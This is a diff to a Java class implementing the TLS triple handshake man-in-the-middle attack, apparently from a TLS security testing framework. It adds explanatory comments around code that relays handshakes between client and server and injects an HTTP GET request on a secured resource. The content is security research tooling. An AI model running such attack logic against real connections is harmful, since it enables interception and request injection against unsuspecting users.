@@ -50,6 +50,7 @@ public class TripleHandshakeAttack extends Attacker<TripleHandshakeAttackCommand
 
     @Override
     public void executeAttack(ConfigHandler clientConfigHandler) {
+	// create server objects
 	ServerCommandConfig serverCommandConfig = new ServerCommandConfig();
 	serverCommandConfig.setPort(config.getPort());
 	serverCommandConfig.setCipherSuites(config.getCipherSuites());
@@ -65,9 +66,12 @@ public class TripleHandshakeAttack extends Attacker<TripleHandshakeAttackCommand
 	TransportHandler serverTransportHandler = serverConfigHandler.initializeTransportHandler(serverCommandConfig);
 	TlsContext serverTlsContext = serverConfigHandler.initializeTlsContext(serverCommandConfig);
 
+	// create client objects
 	TransportHandler clientTransportHandler = clientConfigHandler.initializeTransportHandler(config);
 	TlsContext clientTlsContext = clientConfigHandler.initializeTlsContext(config);
 
+	// load workflow to synchronize the the initial handshake into the
+	// tlsContext objects
 	TripleHandshakeInitialWorkflowConfiguration clientwf = new TripleHandshakeInitialWorkflowConfiguration(
 		clientTlsContext, config);
 	clientwf.createWorkflow();
@@ -76,6 +80,7 @@ public class TripleHandshakeAttack extends Attacker<TripleHandshakeAttackCommand
 		serverTlsContext, config);
 	serverwf.createWorkflow();
 
+	// no manually modification necessary
 	boolean mod = false;
 
 	MitMWorkflowExecutor mitmWorkflowExecutor = new MitMWorkflowExecutor(clientTransportHandler,
@@ -86,6 +91,7 @@ public class TripleHandshakeAttack extends Attacker<TripleHandshakeAttackCommand
 	clientTransportHandler.closeConnection();
 	serverTransportHandler.closeConnection();
 
+	// handle client software, which initiates multiple connections
 	if (config.isPause()) {
 	    System.out.println("Press a Button to continue, if Browser has terminated loading.");
 	    try {
@@ -95,8 +101,11 @@ public class TripleHandshakeAttack extends Attacker<TripleHandshakeAttackCommand
 	    }
 	}
 
+	// load the path to a secured resource
 	clientTlsContext.setCertSecure(config.getCertSecure());
 
+	// load workflow to forward the the session resumption and renegotiation
+	// as well as to inject a HTTP GET request on a secured resource
 	TripleHandshakeWorkflowConfiguration clientwf2 = new TripleHandshakeWorkflowConfiguration(clientTlsContext,
 		config);
 	clientwf2.createWorkflow();
